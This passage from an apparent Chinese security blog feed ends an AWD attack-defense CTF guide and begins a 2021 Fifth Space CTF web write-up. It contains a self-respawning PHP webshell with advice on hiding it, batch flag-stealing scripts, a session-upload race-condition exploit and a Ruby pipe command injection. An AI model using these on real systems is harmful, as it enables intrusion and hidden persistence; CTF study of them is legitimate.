alt="image.png"></p><p>就像这样就好了，就可以直接利用这个连上蚁剑了，连上之后我们就可以找一个比较隐蔽的地方上不死马了，先解释一下啥叫不死马吧，不死马的主要功能是<strong>执行后</strong>会<strong>不断</strong>在该路径生成一个 shell 文件，方便后续使用，不死马如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ignore_user_abort(<span class="literal">true</span>);</span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;1.php&quot;</span>;</span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&quot;&lt;?php eval(\$_REQUEST[1]);?&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">TRUE</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (!file_exists(<span class="variable">$file</span>)) &#123;</span><br><span class="line">file_put_contents(<span class="variable">$file</span>, <span class="variable">$shell</span>);</span><br><span class="line">&#125;</span><br><span class="line">usleep(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>相当于有了这个脚本后它就可以不断的在当前目录下写马，删掉之后接着写，就很狠，这个不死马的名字可以取的和正常文件名字差不多，这样对方就很难找了</p><p>当对方删掉了自带后门之后，我们就可以利用改了的后台密码登入网站后台中，然后在网上搜一搜对应cms如何后台getshell，如果比赛是离线环境的话，我们就要事先准备好离线漏洞库了，在里面搜索对应的cms，对应的版本getshell就行了，getshell之后还是一样的上不死马就行，一般来讲这些漏洞都是现成的，如果要从源码中现审的话时间可能不太够，因为awd节奏实在太快了，它主要考察的就是临场反应的能力和脚本编写的能力，其中有一个很重要的脚本就是批量提交flag的脚本，因为如果队伍比较多的话手动提交flag是不太来得及的，所以说当我们getshell了之后就可以直接编写脚本来批量获取并且提交flag了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"></span><br><span class="line">urllib3.disable_warnings() <span class="comment">#忽略https证书告警</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">POC</span>(<span class="params">target_url</span>):</span></span><br><span class="line">    vuln_url = target_url + <span class="string">&quot;/avatar/system/1.php?s=print_r(readfile(%27/flag%27))&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">                <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url=vuln_url, headers=headers, verify=<span class="literal">False</span>, timeout=<span class="number">10</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(response.text)</span><br><span class="line">            f = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">            f.write(response.text + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./url.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        results = f.readlines()</span><br><span class="line">    <span class="keyword">for</span> result <span class="keyword">in</span> results:</span><br><span class="line">            target_url = result.strip()</span><br><span class="line">            POC(target_url)</span><br></pre></td></tr></table></figure><p>这个脚本仅供参考，这个脚本是le1a师傅给我的，我还没有在比赛中验证过它哈哈，这个需要先把url写入url.txt中，然后它会自动把flag写入flag.txt中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"></span><br><span class="line">urllib3.disable_warnings() <span class="comment">#忽略https证书告警</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">POC</span>(<span class="params">flag</span>):</span></span><br><span class="line">    vuln_url = <span class="string">&quot;https://ctf.bugku.com/pvp/submit.html?token=[token]&amp;flag=&quot;</span> + flag</span><br><span class="line">    headers = &#123;</span><br><span class="line">                <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url=vuln_url, headers=headers, verify=<span class="literal">False</span>, timeout=<span class="number">10</span>)</span><br><span class="line">        <span class="built_in">print</span>(response.text)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;fail&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        results = f.readlines()</span><br><span class="line">    <span class="keyword">for</span> result <span class="keyword">in</span> results:</span><br><span class="line">        flag = result.strip()</span><br><span class="line">        POC(flag)</span><br></pre></td></tr></table></figure><p>然后这个是提交flag的脚本，都没有试过，准备哪天找个bugku的awd比赛来试试脚本</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>写了这么多，时间有点紧感觉总结的很杂乱，不是很成体系，其实awd最重要的就是要提前准备好脚本和waf，以及漏洞库；比赛前队伍中做好分工，比赛开始的时候拼手速，先把必须要做的都做了，然后随机应变，现场搜索漏洞或者做好流量监控找机会打别人就好了，如果被打了心态也不要崩，因为他肯定是批量打的不可能只打我们一家，抓好流量找机会反打就好了</p><p>参考链接：</p><p><a href="https://www.freebuf.com/articles/network/201222.html">https://www.freebuf.com/articles/network/201222.html</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;一文了解CTF线下赛-—-AWD&quot;&gt;&lt;a href=&quot;#一文了解CTF线下赛-—-AWD&quot; class=&quot;headerlink&quot; title=&quot;一文了解CTF线下赛 — AWD&quot;&gt;&lt;/a&gt;一文了解CTF线下赛 — AWD&lt;/h1&gt;&lt;p&gt;前几天和&lt;code&gt;Light1ng&lt;/code&gt;的师傅们一起参加了在天津举办的第五空间决赛，虽然结果不尽如人意，全程被pwn爷爷带飞，而web的环境还时不时宕机，分不清是被打了还是主办方的环境坏了，所以web手基本上全程坐牢，太痛苦了，最后狗了一个三等奖，但这次比赛还是收获了很多，面基到了各位师傅很开心，接下来就来简单总结一下awd吧，因为我也只是个web手，所以说以下的总结也都只针对web哈&lt;/p&gt;</summary>
    
    
    
    
    <category term="Web安全" scheme="https://arsenetang.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
    <category term="AWD" scheme="https://arsenetang.github.io/tags/AWD/"/>
    
  </entry>
  
  <entry>
    <title>WP篇之2021第五空间线上赛(部分Web)</title>
    <link href="https://arsenetang.github.io/2021/09/17/WP%E7%AF%87%E4%B9%8B2021%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BA%BF%E4%B8%8A%E8%B5%9B(%E9%83%A8%E5%88%86Web)/"/>
    <id>https://arsenetang.github.io/2021/09/17/WP%E7%AF%87%E4%B9%8B2021%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BA%BF%E4%B8%8A%E8%B5%9B(%E9%83%A8%E5%88%86Web)/</id>
    <published>2021-09-16T16:00:00.000Z</published>
    <updated>2021-09-17T12:31:00.503Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2021第五空间线上赛-部分Web"><a href="#2021第五空间线上赛-部分Web" class="headerlink" title="2021第五空间线上赛(部分Web)"></a>2021第五空间线上赛(部分Web)</h1><p>昨天打了第五空间的比赛，虽然说环境是真的垃圾，居然还用的是静态靶机，一堆人在里面乱搞导致题目老是出问题；不过我觉得这次web题的质量还是不错的，难度比较合适，也能从中学到一些东西</p><span id="more"></span><h2 id="1-EasyCleanup"><a href="#1-EasyCleanup" class="headerlink" title="1.EasyCleanup"></a>1.EasyCleanup</h2><p><img src="https://i.loli.net/2021/09/17/CVqLIwd9EMbpBui.png" alt="image.png"></p><p>这道题进去直接就是源码，如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>] == <span class="string">&quot;eval&quot;</span>)&#123;</span><br><span class="line">    <span class="variable">$shell</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>] ?? <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(strlen(<span class="variable">$shell</span>) &gt; <span class="number">15</span> | filter(<span class="variable">$shell</span>) | checkNums(<span class="variable">$shell</span>)) <span class="keyword">exit</span>(<span class="string">&quot;hacker&quot;</span>);</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$shell</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(strlen(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &gt; <span class="number">15</span> | filter(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) <span class="keyword">exit</span>(<span class="string">&quot;hacker&quot;</span>);</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$var</span></span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">    <span class="variable">$banned</span> = [<span class="string">&quot;while&quot;</span>, <span class="string">&quot;for&quot;</span>, <span class="string">&quot;\$_&quot;</span>, <span class="string">&quot;include&quot;</span>, <span class="string">&quot;env&quot;</span>, <span class="string">&quot;require&quot;</span>, <span class="string">&quot;?&quot;</span>, <span class="string">&quot;:&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;+&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;`&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$banned</span> <span class="keyword">as</span> <span class="variable">$ban</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(strstr(<span class="variable">$var</span>, <span class="variable">$ban</span>)) <span class="keyword">return</span> <span class="literal">True</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkNums</span>(<span class="params"><span class="variable">$var</span></span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">    <span class="variable">$alphanum</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>;</span><br><span class="line">    <span class="variable">$cnt</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$alphanum</span>); <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; strlen(<span class="variable">$var</span>); <span class="variable">$j</span>++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$var</span>[<span class="variable">$j</span>] == <span class="variable">$alphanum</span>[<span class="variable">$i</span>])&#123;</span><br><span class="line">                <span class="variable">$cnt</span> += <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$cnt</span> &gt; <span class="number">8</span>) <span class="keyword">return</span> <span class="literal">True</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里看到存在文件包含而且参数可控，这种情况下基本上都可以用<code>session.upload_progress</code>直接一把梭哈；但这里前面都给了<code>eval</code>并且提示了<code>phpinfo()</code>，那我们就先看看<code>phpinfo()</code>中的内容嘛，看是不是满足条件竞争的要求：</p><p><img src="https://i.loli.net/2021/09/17/RZIyJPkWgCBvjb7.png" alt="image.png"></p><p>发现没有问题，是符合的，而且这里很离谱的是，<code>session.upload_progress.cleanup</code>居然是<code>Off</code>，也就是说上传上去之后它甚至都不会自动清理，那我认为甚至都不用使用条件竞争了，直接发一次包应该就可以了，那我们就写一个表单然后用burp抓包来看看，具体的操作可以看我之前写过的博客</p><p><img src="https://i.loli.net/2021/09/17/N7YiXdstBQyfwlg.png" alt="image.png"></p><p>就这样上传上去，然后访问，看能不能成功</p><p><img src="https://i.loli.net/2021/09/17/wDAavJgykniBWs3.png" alt="image.png"></p><p>成功包含，那接下来就直接写马了啊，把内容改为<code>&lt;?php eval($_REQUEST[1]);?&gt;</code></p><p><img src="https://i.loli.net/2021/09/17/7OkgUVHvd8MGQBZ.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/09/17/LRytcFnQGCxA3dI.png" alt="image.png"></p><p>成功拿下，接下来我还是把条件竞争的脚本放出来，感觉那种才是常规方法哈哈哈哈：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">host = <span class="string">&#x27;http://114.115.134.72:32770/index.php&#x27;</span></span><br><span class="line">sessid = <span class="string">&#x27;la&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">POST</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        session.post(</span><br><span class="line">            host,</span><br><span class="line">            data=&#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&quot;&lt;?php eval($_REQUEST[1]);echo md5(&#x27;1&#x27;);?&gt;&quot;</span>&#125;,</span><br><span class="line">            files=&#123;<span class="string">&quot;file&quot;</span>:(<span class="string">&#x27;a.txt&#x27;</span>, f)&#125;,</span><br><span class="line">            cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:sessid&#125;,</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">READ</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = session.get(<span class="string">f&#x27;<span class="subst">&#123;host&#125;</span>?file=/tmp/sess_<span class="subst">&#123;sessid&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="comment"># print(response.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[+++]retry&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(response.text)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">    t1 = threading.Thread(target=POST, args=(session, ))</span><br><span class="line">    t1.daemon = <span class="literal">True</span></span><br><span class="line">    t1.start()</span><br><span class="line">    READ(session)</span><br></pre></td></tr></table></figure><h2 id="2-WebFTP"><a href="#2-WebFTP" class="headerlink" title="2.WebFTP"></a>2.WebFTP</h2><p><img src="https://i.loli.net/2021/09/17/cDfojAaBGJXr8u7.png" alt="image.png"></p><p>进去之后发现是WebFTP2021的cms，那就先去找源码，成功找到源码：<a href="https://github.com/wifeat/WebFTP">https://github.com/wifeat/WebFTP</a></p><p>然后可以看到它的初始管理员账号是<code>admin</code>，密码为<code>admin888</code>，但这道题明显是被改过了，显示密码错误，那我们就先把源码down下来，然后放到<code>Seay</code>源代码审计系统里面去看它，首先看看有没有<code>eval</code>，发现在这个<code>mytz.php</code>中发现了<code>eval</code></p><p><img src="https://i.loli.net/2021/09/17/73NZgaokfPXOhYJ.png" alt="image.png"></p><p>再往下看，后面出现了<code>phpinfo</code>，那就先看看<code>phpinfo</code>，说不定flag就在里面，因为这<code>eval</code>也很难利用</p><p><img src="https://i.loli.net/2021/09/17/hJpTblkrKS3Qt8E.png" alt="image.png"></p><p>发现的确如此，直接给它拿下了，这道题给我的启发就是以后也可以直接搜<code>phpinfo</code>试试</p><p><img src="https://i.loli.net/2021/09/17/KEj1YJQGbDkBaq6.png" alt="image.png"></p><h2 id="3-PNG图片转换器"><a href="#3-PNG图片转换器" class="headerlink" title="3.PNG图片转换器"></a>3.PNG图片转换器</h2><p>这个题进去之后有两个选项，一个是上传图片，另一个是转换图片，先上传一个png上去试试，传上去了之后返回了文件名，然后放到转换图片的页面去转换，它就会将图片内容base64编码，好像暂时没什么思路，但这道题是给了源码的，先把源码下下来看看：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sinatra&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;digest&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;base64&#x27;</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  open(<span class="string">&quot;./view/index.html&quot;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/upload&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  open(<span class="string">&quot;./view/upload.html&quot;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">post <span class="string">&#x27;/upload&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">unless</span> params[<span class="symbol">:file</span>] &amp;&amp; params[<span class="symbol">:file</span>][<span class="symbol">:tempfile</span>] &amp;&amp; params[<span class="symbol">:file</span>][<span class="symbol">:filename</span>] &amp;&amp; params[<span class="symbol">:file</span>][<span class="symbol">:filename</span>].split(<span class="string">&#x27;.&#x27;</span>)[-<span class="number">1</span>] == <span class="string">&#x27;png&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;error&#x27;);location.href=&#x27;/upload&#x27;;&lt;/script&gt;&quot;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">begin</span></span><br><span class="line">    filename = Digest::MD5.hexdigest(Time.now.to_i.to_s + params[<span class="symbol">:file</span>][<span class="symbol">:filename</span>]) + <span class="string">&#x27;.png&#x27;</span></span><br><span class="line">    open(filename, <span class="string">&#x27;wb&#x27;</span>) &#123; <span class="params">|f|</span></span><br><span class="line">      f.write open(params[<span class="symbol">:file</span>][<span class="symbol">:tempfile</span>],<span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="string">&quot;Upload success, file stored at <span class="subst">#&#123;filename&#125;</span>&quot;</span></span><br><span class="line">  <span class="keyword">rescue</span></span><br><span class="line">    <span class="string">&#x27;something wrong&#x27;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/convert&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  open(<span class="string">&quot;./view/convert.html&quot;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">post <span class="string">&#x27;/convert&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">begin</span></span><br><span class="line">    <span class="keyword">unless</span> params[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;error&#x27;);location.href=&#x27;/convert&#x27;;&lt;/script&gt;&quot;</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    file = params[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">unless</span> file.index(<span class="string">&#x27;..&#x27;</span>) == <span class="literal">nil</span> &amp;&amp; file.index(<span class="string">&#x27;/&#x27;</span>) == <span class="literal">nil</span> &amp;&amp; file =~ <span class="regexp">/^(.+)\.png$/</span></span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;dont hack me&#x27;);&lt;/script&gt;&quot;</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    res = open(file, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">    headers <span class="string">&#x27;Content-Type&#x27;</span> =&gt; <span class="string">&quot;text/html; charset=utf-8&quot;</span></span><br><span class="line">    <span class="string">&quot;var img = document.createElement(\&quot;img\&quot;);\nimg.src= \&quot;data:image/png;base64,&quot;</span> + Base64.encode64(res).gsub(<span class="regexp">/\s*/</span>, <span class="string">&#x27;&#x27;</span>) + <span class="string">&quot;\&quot;;\n&quot;</span></span><br><span class="line">  <span class="keyword">rescue</span></span><br><span class="line">    <span class="string">&#x27;something wrong&#x27;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>好家伙，是用<code>rb</code>语言写的，这是真的头疼因为根本没学过这语言，只能尽力审一审，发现在<code>convert</code>中有问题：</p><p><img src="https://i.loli.net/2021/09/17/c2ni937PhxI1Tsw.png" alt="image.png"></p><p>我们可以试试先将命令写入图片中，然后在上传页面把图片传上去，最后在转换图片的页面<code>convert</code>用<code>sh</code>来执行这个图片文件，执行命令的结果就会再写入图片中，然后它会返回图片内容，不就相当于返回了命令执行的结果了吗？当然这只是一个思路哈，也不一定成功，但在这种既有上传图片页面也有解析图片页面的时候就可以试试，接下来开始操作：</p><p>首先新建一个<code>1.txt</code>文件，里面内容为<code>ls /</code>，然后改名字为<code>1.png</code>，上传上去，先用burp抓个包：</p><p><img src="https://i.loli.net/2021/09/17/FSwcEYiImRMBNhj.png" alt="image.png"></p><p>得到文件名为<code>bb4620fa4c0a596d1d7ac66632a48a29.png</code>，然后在<code>convert</code>页面下解析这张图片，还是先抓个包：</p><p><img src="https://i.loli.net/2021/09/17/pJKPeC3yv6cjZ7h.png" alt="image.png"></p><p>可以看到我们的命令已经写进去了，接下来就是执行它，直接用<code>sh</code>就行，前面加一个<code>|</code></p><p><img src="https://i.loli.net/2021/09/17/y3KPe96HsFDn4G2.png" alt="image.png"></p><p><code>base64</code>解码出来是flag的名字是<code>FLA9_VixNxtSRFfd8IoFlnNvv</code>，那直接读它就拿下了</p><p><img src="https://i.loli.net/2021/09/17/nR4KxrjdPkh8vp3.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/09/17/jGh47aPLye8D6mU.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/09/17/tm3HIelgSo9Rxqa.png" alt="image.png"></p><p>成功拿下，flag解码出来是<code>flag&#123;Tvauy36vE0Mwt9WYOZVOR3dlNT9JTiX4&#125;</code>，这道题更多的是学到了一种新思路，也就是说即使把命令写在文件中它也是可以被执行的，在<code>kali</code>中我也试过，确实是没问题</p><h2 